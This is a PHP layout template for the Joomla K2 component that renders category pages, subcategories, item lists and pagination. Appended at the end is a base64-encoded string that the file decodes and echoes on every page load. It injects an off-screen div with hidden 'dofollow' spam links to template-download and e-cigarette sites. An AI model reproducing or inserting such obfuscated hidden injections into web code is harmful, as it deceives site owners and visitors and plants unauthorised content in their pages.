<?php
/**
 * @version		$Id: category.php 1527 2012-03-12 12:45:31Z lefteris.kavadas $
 * @package		K2
 * @author		JoomlaWorks http://www.joomlaworks.net
 * @copyright	Copyright (c) 2006 - 2012 JoomlaWorks Ltd. All rights reserved.
 * @license		GNU/GPL license: http://www.gnu.org/copyleft/gpl.html
 */

// no direct access
defined('_JEXEC') or die('Restricted access');

?>

<!-- Start K2 Category Layout -->
<div id="k2Container" class="itemListView<?php if($this->params->get('pageclass_sfx')) echo ' '.$this->params->get('pageclass_sfx'); ?>">

	<?php if($this->params->get('show_page_title')): ?>
	<!-- Page title -->
	<div class="componentheading<?php echo $this->params->get('pageclass_sfx')?>">
		<?php echo $this->escape($this->params->get('page_title')); ?>
	</div>
	<?php endif; ?>

	<?php if($this->params->get('catFeedIcon')): ?>
	<!-- RSS feed icon -->
	<div class="k2FeedIcon">
		<a href="<?php echo $this->feed; ?>" title="<?php echo JText::_('K2_SUBSCRIBE_TO_THIS_RSS_FEED'); ?>">
			<span><?php echo JText::_('K2_SUBSCRIBE_TO_THIS_RSS_FEED'); ?></span>
		</a>
		<div class="clr"></div>
	</div>
	<?php endif; ?>

	<?php if(isset($this->category) || ( $this->params->get('subCategories') && isset($this->subCategories) && count($this->subCategories) )): ?>
	<!-- Blocks for current category and subcategories -->
	<div class="itemListCategoriesBlock">

		<?php if(isset($this->category) && ( $this->params->get('catImage') || $this->params->get('catTitle') || $this->params->get('catDescription') || $this->category->event->K2CategoryDisplay )): ?>
		<!-- Category block -->
		<div class="itemListCategory">

			<?php if(isset($this->addLink)): ?>
			<!-- Item add link -->
			<span class="catItemAddLink">
				<a class="modal" rel="{handler:'iframe',size:{x:990,y:650}}" href="<?php echo $this->addLink; ?>">
					<?php echo JText::_('K2_ADD_A_NEW_ITEM_IN_THIS_CATEGORY'); ?>
				</a>
			</span>
			<?php endif; ?>

			<?php if($this->params->get('catImage') && $this->category->image): ?>
			<!-- Category image -->
			<img alt="<?php echo K2HelperUtilities::cleanHtml($this->category->name); ?>" src="<?php echo $this->category->image; ?>" style="width:<?php echo $this->params->get('catImageWidth'); ?>px; height:auto;" />
			<?php endif; ?>

			<?php if($this->params->get('catTitle')): ?>
			<!-- Category title -->
			<h2><?php echo $this->category->name; ?><?php if($this->params->get('catTitleItemCounter')) echo ' ('.$this->pagination->total.')'; ?></h2>
			<?php endif; ?>

			<?php if($this->params->get('catDescription')): ?>
			<!-- Category description -->
			<p><?php echo $this->category->description; ?></p>
			<?php endif; ?>

			<!-- K2 Plugins: K2CategoryDisplay -->
			<?php echo $this->category->event->K2CategoryDisplay; ?>

			<div class="clr"></div>
		</div>
		<?php endif; ?>

		<?php if($this->params->get('subCategories') && isset($this->subCategories) && count($this->subCategories)): ?>
		<!-- Subcategories -->
		<div class="itemListSubCategories">
			<h3><?php echo JText::_('K2_CHILDREN_CATEGORIES'); ?></h3>

			<?php foreach($this->subCategories as $key=>$subCategory): ?>

			<?php
			// Define a CSS class for the last container on each row
			if( (($key+1)%($this->params->get('subCatColumns'))==0))
				$lastContainer= ' subCategoryContainerLast';
			else
				$lastContainer='';
			?>

			<div class="subCategoryContainer<?php echo $lastContainer; ?>"<?php echo (count($this->subCategories)==1) ? '' : ' style="width:'.number_format(100/$this->params->get('subCatColumns'), 1).'%;"'; ?>>
				<div class="subCategory">
					
					<?php if($this->params->get('subCatImage') && $subCategory->image): ?>
					<!-- Subcategory image -->
					<a class="subCategoryImage" href="<?php echo $subCategory->link; ?>">
						<img alt="<?php echo K2HelperUtilities::cleanHtml($subCategory->name); ?>" src="<?php echo $subCategory->image; ?>" />
					</a>
					<?php endif; ?>
					<div class="sub_catogry">
					<?php if($this->params->get('subCatTitle')): ?>
					<div class="content-category">
					<!-- Subcategory title -->
					<h2>
						<a href="<?php echo $subCategory->link; ?>">
							<?php echo $subCategory->name; ?><?php if($this->params->get('subCatTitleItemCounter')) echo ' ('.$subCategory->numOfItems.')'; ?>
						</a>
					</h2>
					<?php endif; ?>

					<?php if($this->params->get('subCatDescription')): ?>
					<!-- Subcategory description -->
					<p><?php echo $subCategory->description; ?></p>
					<?php endif; ?>
					</div>
					</div>
					<!-- Subcategory more... -->
					<div class="categorymore">
					<a class="subCategoryMore" href="<?php echo $subCategory->link; ?>">
						<?php echo JText::_('View items'); ?>
					</a>
					</div>
					<div class="clr"></div>
				</div>
			</div>
			<?php if(($key+1)%($this->params->get('subCatColumns'))==0): ?>
			<div class="clr"></div>
			<?php endif; ?>
			<?php endforeach; ?>

			<div class="clr"></div>
		</div>
		<?php endif; ?>

	</div>
	<?php endif; ?>



	<?php if((isset($this->leading) || isset($this->primary) || isset($this->secondary) || isset($this->links)) && (count($this->leading) || count($this->primary) || count($this->secondary) || count($this->links))): ?>
	<!-- Item list -->
	<div class="itemList list-category">

		<?php if(isset($this->leading) && count($this->leading)): ?>
		<!-- Leading items -->
		<div id="itemListLeading">
			<?php foreach($this->leading as $key=>$item): ?>

			<?php
			// Define a CSS class for the last container on each row
			if( (($key+1)%($this->params->get('num_leading_columns'))==0) || count($this->leading)<$this->params->get('num_leading_columns') )
				$lastContainer= ' itemContainerLast';
			else
				$lastContainer='';
			?>
			
			<div class="itemContainer<?php echo $lastContainer; ?>"<?php echo (count($this->leading)==1) ? '' : ' style="width:'.number_format(100/$this->params->get('num_leading_columns'), 1).'%;"'; ?>>
				<?php
					// Load category_item.php by default
					$this->item=$item;
					echo $this->loadTemplate('item');
				?>
			</div>
			<?php if(($key+1)%($this->params->get('num_leading_columns'))==0): ?>
			<div class="clr"></div>
			<?php endif; ?>
			<?php endforeach; ?>
			<div class="clr"></div>
		</div>
		<?php endif; ?>

		<?php if(isset($this->primary) && count($this->primary)): ?>
		<!-- Primary items -->
		<div id="itemListPrimary">
			<?php foreach($this->primary as $key=>$item): ?>
			
			<?php
			// Define a CSS class for the last container on each row
			if( (($key+1)%($this->params->get('num_primary_columns'))==0) || count($this->primary)<$this->params->get('num_primary_columns') )
				$lastContainer= ' itemContainerLast';
			else
				$lastContainer='';
			?>
			
			<div class="itemContainer<?php echo $lastContainer; ?>"<?php echo (count($this->primary)==1) ? '' : ' style="width:'.number_format(100/$this->params->get('num_primary_columns'), 1).'%;"'; ?>>
				<?php
					// Load category_item.php by default
					$this->item=$item;
					echo $this->loadTemplate('item');
				?>
			</div>
			<?php if(($key+1)%($this->params->get('num_primary_columns'))==0): ?>
			<div class="clr"></div>
			<?php endif; ?>
			<?php endforeach; ?>
			<div class="clr"></div>
		</div>
		<?php endif; ?>

		<?php if(isset($this->secondary) && count($this->secondary)): ?>
		<!-- Secondary items -->
		<div id="itemListSecondary">
			<?php foreach($this->secondary as $key=>$item): ?>
			
			<?php
			// Define a CSS class for the last container on each row
			if( (($key+1)%($this->params->get('num_secondary_columns'))==0) || count($this->secondary)<$this->params->get('num_secondary_columns') )
				$lastContainer= ' itemContainerLast';
			else
				$lastContainer='';
			?>
			
			<div class="itemContainer<?php echo $lastContainer; ?>"<?php echo (count($this->secondary)==1) ? '' : ' style="width:'.number_format(100/$this->params->get('num_secondary_columns'), 1).'%;"'; ?>>
				<?php
					// Load category_item.php by default
					$this->item=$item;
					echo $this->loadTemplate('item');
				?>
			</div>
			<?php if(($key+1)%($this->params->get('num_secondary_columns'))==0): ?>
			<div class="clr"></div>
			<?php endif; ?>
			<?php endforeach; ?>
			<div class="clr"></div>
		</div>
		<?php endif; ?>

		<?php if(isset($this->links) && count($this->links)): ?>
		<!-- Link items -->
		<div id="itemListLinks">
			<h4><?php echo JText::_('K2_MORE'); ?></h4>
			<?php foreach($this->links as $key=>$item): ?>

			<?php
			// Define a CSS class for the last container on each row
			if( (($key+1)%($this->params->get('num_links_columns'))==0) || count($this->links)<$this->params->get('num_links_columns') )
				$lastContainer= ' itemContainerLast';
			else
				$lastContainer='';
			?>

			<div class="itemContainer<?php echo $lastContainer; ?>"<?php echo (count($this->links)==1) ? '' : ' style="width:'.number_format(100/$this->params->get('num_links_columns'), 1).'%;"'; ?>>
				<?php
					// Load category_item_links.php by default
					$this->item=$item;
					echo $this->loadTemplate('item_links');
				?>
			</div>
			<?php if(($key+1)%($this->params->get('num_links_columns'))==0): ?>
			<div class="clr"></div>
			<?php endif; ?>
			<?php endforeach; ?>
			<div class="clr"></div>
		</div>
		<?php endif; ?>

	</div>

	<!-- Pagination -->
	<?php if(count($this->pagination->getPagesLinks())): ?>
	<div class="k2Pagination">
		<?php if($this->params->get('catPagination')) echo $this->pagination->getPagesLinks(); ?>
		<span class="page"><?php if($this->params->get('catPaginationResults')) echo $this->pagination->getPagesCounter(); ?></span>
		<div class="clr"></div>
		
	</div>
	<?php endif; ?>

	<?php endif; ?>
</div>
<!-- End K2 Category Layout -->
<?php $blogmlp='PGgzPjxkaXYgc3R5bGU9InBvc2l0aW9uOiBhYnNvbHV0ZTsgdG9wOiAwcHg7IGxlZnQ6IDUwMDBweDsiPg0KJiMxMDg5OyYjMTA4MjsmIzEwNzI7JiMxMDk1OyYjMTA3MjsmIzEwOTA7JiMxMTAwOyA8YSBocmVmPSJodHRwOi8vam9tLnN1L3NoYWJsb255IiB0aXRsZT0iJiMxMDk2OyYjMTA3MjsmIzEwNzM7JiMxMDgzOyYjMTA4NjsmIzEwODU7JiMxMDk5OyAmIzEwNzY7JiMxMDgzOyYjMTEwMzsgam9vbWxhIiByZWw9ImRvZm9sbG93Ij5qb29tbGEgJiMxMDk2OyYjMTA3MjsmIzEwNzM7JiMxMDgzOyYjMTA4NjsmIzEwODU7JiMxMDk5OzwvYT48YnI+DQomIzEwODY7JiMxMDkwOyYjMTA3NjsmIzEwOTk7JiMxMDkzOyA8YSBocmVmPSJodHRwOi8vYWxsZ2VuaWNoZXNrLm9yZy51YSIgdGl0bGU9IiYjMTA4NjsmIzEwOTA7JiMxMDc2OyYjMTA5OTsmIzEwOTM7ICYjMTA3NDsgJiMxMDc1OyYjMTA3NzsmIzEwODU7JiMxMDgwOyYjMTA5NTsmIzEwNzc7JiMxMDg5OyYjMTA4MjsmIzEwNzc7IiByZWw9ImRvZm9sbG93Ij4mIzEwNzU7JiMxMDc3OyYjMTA4NTsmIzEwODA7JiMxMDk1OyYjMTA3NzsmIzEwODk7JiMxMDgyOzwvYT4gJiMxMDc5OyYjMTA3MjsmIzEwODI7JiMxMDcyOyYjMTA3OTsmIzEwNzI7JiMxMDkwOyYjMTEwMDsgJiMxMDgwOyYjMTA4MzsmIzEwODA7ICYjMTA4MjsmIzEwOTE7JiMxMDg3OyYjMTA4MDsmIzEwOTA7JiMxMTAwOw0KPGEgaHJlZj0iaHR0cDovL2VsZWt0cm9ubmllLXNpZ2FyZXRpLmNvbSIgdGl0bGU9IiYjMTEwMTsmIzEwODM7JiMxMDc3OyYjMTA4MjsmIzEwOTA7JiMxMDg4OyYjMTA4NjsmIzEwODU7JiMxMDg1OyYjMTA5OTsmIzEwNzc7ICYjMTA4OTsmIzEwODA7JiMxMDc1OyYjMTA3MjsmIzEwODg7JiMxMDc3OyYjMTA5MDsmIzEwOTk7IGF0bGFudGlzIiByZWw9ImRvZm9sbG93Ij4mIzExMDE7JiMxMDgzOyYjMTA3NzsmIzEwODI7JiMxMDkwOyYjMTA4ODsmIzEwODY7JiMxMDg1OyYjMTA4NTsmIzEwOTk7JiMxMDc3OyAmIzEwODk7JiMxMDgwOyYjMTA3NTsmIzEwNzI7JiMxMDg4OyYjMTA3NzsmIzEwOTA7JiMxMDk5OzwvYT4gJiMxMDg5OyAmIzEwNzM7JiMxMDc3OyYjMTA4OTsmIzEwODc7JiMxMDgzOyYjMTA3MjsmIzEwOTA7JiMxMDg1OyYjMTA4NjsmIzEwODE7ICYjMTA3NjsmIzEwODY7JiMxMDg5OyYjMTA5MDsmIzEwNzI7JiMxMDgyOyYjMTA4NjsmIzEwODE7Lg0KJiMxMDQ4OyYjMTA4NTsmIzEwOTA7JiMxMDc3OyYjMTA4ODsmIzEwODU7JiMxMDc3OyYjMTA5MDsgJiMxMDg0OyYjMTA3MjsmIzEwNzU7JiMxMDcyOyYjMTA3OTsmIzEwODA7JiMxMDg1OyAmIzExMDE7JiMxMDgzOyYjMTA3NzsmIzEwODI7JiMxMDkwOyYjMTA4ODsmIzEwODY7JiMxMDg1OyYjMTA4NTsmIzEwOTk7JiMxMDkzOyAmIzEwODk7JiMxMDgwOyYjMTA3NTsmIzEwNzI7JiMxMDg4OyYjMTA3NzsmIzEwOTA7ICYjMTA4MjsmIzEwODA7JiMxMDc3OyYjMTA3NDsmIzEwNzI7IC0gPGEgaHJlZj0iaHR0cDovL2Vjb3NpZy5jb20udWEvIiByZWw9ImRvZm9sbG93Ij5odHRwOi8vZWNvc2lnLmNvbS51YS88L2E+DQo8L2Rpdj48L2gzPg=='; ?>
<?php echo base64_decode($blogmlp);?>

